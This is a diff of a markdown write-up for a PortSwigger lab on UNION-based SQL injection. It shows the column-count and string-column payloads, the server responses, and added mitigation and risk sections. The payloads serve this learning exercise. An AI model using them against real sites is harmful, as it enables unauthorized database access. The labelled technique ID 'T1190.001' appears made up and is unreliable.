@@ -7,14 +7,21 @@ The lab will provide a random value that you need to make appear within the quer
 
 ---
 
-## Process
+## Vulnerability Analysis
 
-### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
-```http
-GET /filter?category=Gifts HTTP/2
-```
+### Attack Vector Identification
+- **Entry Point**: `category` parameter in GET request
+- **Vulnerability Type**: T1190.001 - SQL Injection: UNION Data Type Identification (CWE-89)
+- **Security Flaw:** User input is embedded directly into SQL queries
 
-### 2. Modified the category parameter to Determine Column Count
+### Vulnerability Assessment & Exploitation
+
+**Initial Approach:**
+- Intercepted HTTP requests using Burp Suite
+- Identified category parameter as potential injection point
+- Performed systematic input validation testing
+
+**Step 1: Determining Column Count**
 
 ```sql
 ' UNION SELECT NULL--
@@ -35,15 +42,17 @@ Response: HTTP/2 200 OK
 
 Confirmed the number of columns = 3, as response returned HTTP 200.
 
-Alternative approach: Using `ORDER BY` can also determine the column count. An error will be displayed at `' ORDER BY 4`.
+**Note:** Using `ORDER BY` can also determine the column count. An error will be displayed at `' ORDER BY 4`.
 
-### 3. Identified Column Accepting String Output
+**Step 2: Identifying String-Compatible Columns**
 
+**Testing first column:**
 ```sql
 ' UNION SELECT 'a',NULL,NULL--
 ```
-Response: HTTP/2 500 Internal Server
+Response: HTTP/2 500 Internal Server Error
 
+**Testing second column:**
 ```sql
 ' UNION SELECT NULL,'a',NULL--
 ```
@@ -51,11 +60,11 @@ Response: HTTP/2 200 OK
 
 Injected `'a'` is a visible test string and will appear on the page if the injection works.
 
+**Step 3: Solving the Lab and Verifying the Result**
+
 ![burpsuite response](./misc-images/04-2.png)
 
-But, this did not solve the lab. The response included a hint: Make the database should retrieve the string 'xE5jkD'
-
-### 4. Solved the Lab Using the Required Payload
+The response included a hint: Make the database retrieve the string 'xE5jkD'.
 
 ```sql
 ' UNION SELECT NULL,'xE5jkD',NULL--
@@ -65,25 +74,41 @@ But, this did not solve the lab. The response included a hint: Make the database
 
 As expected, the response said "Congratulations you solved the lab!"
 
-### 5. Forwarded the Final Payload
-
-Forwarded the final payload and confirmed that the  injected string 'xE5jkD' was displayed on the webpage.
+Forwarded the final payload and confirmed that the injected string 'xE5jkD' was displayed on the webpage.
 
 ![portswigger webpage](./misc-images/04-5.png)
 
 ---
 
+## Security Assessment
+
+### Root Cause Analysis
+- Application concatenates user input directly into SQL queries
+- No input validation or sanitization implemented
+- Parameterized queries (prepared statements) are not used
+
+### Risk Assessment
+| Category | Impact |
+|----------|--------|
+| Information Disclosure | High – Database structure exposed |
+| Data Access | High – Potential access to other tables |
+| Query Manipulation | High – UNION attacks possible |
+
+---
+
 ## Mitigation
 
-Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
+- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
 
-Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)
+Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#mitigation)
+
+- Restrict database permissions using the principle of least privilege.
 
 ---
 
 ## Reflection
 
--Learned the second step of a UNION-based SQL injection: identifying the columns with string data using `UNION SELECT` query.
+This lab demonstrated the second step of a UNION-based SQL injection: identifying columns compatible with string data using `UNION SELECT` queries. The systematic testing with string values proved highly effective in determining which columns can display text data. Learned the importance of understanding data type compatibility for successful UNION attacks.
 
 ---
 
